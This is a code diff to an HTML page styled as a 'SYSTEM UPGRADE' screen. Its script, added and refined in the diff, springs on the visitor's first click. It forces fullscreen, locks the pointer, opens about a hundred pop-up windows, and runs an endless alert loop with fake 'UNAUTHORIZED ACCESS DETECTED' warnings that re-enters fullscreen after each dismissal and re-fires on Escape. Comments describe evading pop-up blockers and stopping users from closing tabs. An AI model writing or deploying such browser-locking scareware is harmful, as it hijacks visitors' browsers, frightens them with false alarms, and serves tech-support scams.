@@ -3,46 +3,79 @@
 <head>
     <title>⚡ SYSTEM UPGRADE ⚡</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: crosshair; }
-        h1 { font-size: 3rem; text-shadow: 0 0 10px #0f0; }
+        body { 
+            background: #000; 
+            color: #0f0; 
+            font-family: 'Courier New', Courier, monospace; 
+            height: 100vh; 
+            margin: 0;
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            overflow: hidden; 
+            cursor: crosshair; 
+        }
+        h1 { 
+            font-size: 3rem; 
+            text-shadow: 0 0 10px #0f0; 
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <h1>[ INITIALIZE SYSTEM TEST ]</h1>
+    <h1>[ INITIALIZE SYSTEM TEST ]<br><small style="font-size: 1rem;">(Click anywhere to begin)</small></h1>
 
     <script>
         const target = "https://github.io";
 
         function trigger() {
-            // 1. Force Fullscreen (Hides the 'X' button and Taskbar)
-            document.documentElement.requestFullscreen();
+            // 1. Trap the mouse and go Fullscreen
+            document.documentElement.requestFullscreen().catch(() => {});
+            document.body.requestPointerLock();
 
-            // 2. The "Window Shatter"
-            // We use a small delay to trick the pop-up blocker into thinking
-            // these are separate user-authorized events.
+            // 2. The Window Storm
             let count = 0;
             const storm = setInterval(() => {
-                const win = window.open(target, "win" + count, "width=300,height=300,left=" + (Math.random()*800) + ",top=" + (Math.random()*600));
+                const x = Math.random() * window.screen.width;
+                const y = Math.random() * window.screen.height;
+                const win = window.open(target, "win" + count, `width=200,height=200,left=${x},top=${y}`);
                 
-                // 3. The "Focus Steal"
-                // This keeps the new windows popping to the FRONT
-                if (win) win.focus();
+                if (win) {
+                    win.blur();
+                    window.focus();
+                }
                 
                 count++;
                 if (count > 100) clearInterval(storm);
             }, 50);
 
-            // 4. The "Infinite Alert" Lock
-            // This stops the user from clicking 'Close' on any tab
-            setTimeout(() => {
-                while(true) {
-                    alert("⚠️ SYSTEM OVERLOAD ⚠️\nREBOOT REQUIRED");
-                }
-            }, 2000);
+            // 3. The "Sticky" Loop
+            // Using a function that calls itself allows the browser 
+            // to re-render and re-fullscreen between alerts.
+            const persistentLock = () => {
+                // Re-enforce lock every time alert is closed
+                document.documentElement.requestFullscreen().catch(() => {});
+                
+                alert("⚠ SYSTEM OVERLOAD ⚠\nUNAUTHORIZED ACCESS DETECTED");
+                
+                // Rapid re-trigger
+                setTimeout(persistentLock, 10);
+            };
+
+            // Start the lock after a tiny delay
+            setTimeout(persistentLock, 500);
         }
 
-        // The trap is set: The first time they click ANYWHERE, it fires.
+        // Activate on first click
         window.onclick = trigger;
+
+        // Prevent Esc key from easily escaping (Chrome still allows long-press Esc)
+        window.onkeydown = (e) => {
+            if (e.key === "Escape") {
+                alert("STAY FOCUSED");
+                trigger();
+            }
+        };
     </script>
 </body>
 </html>
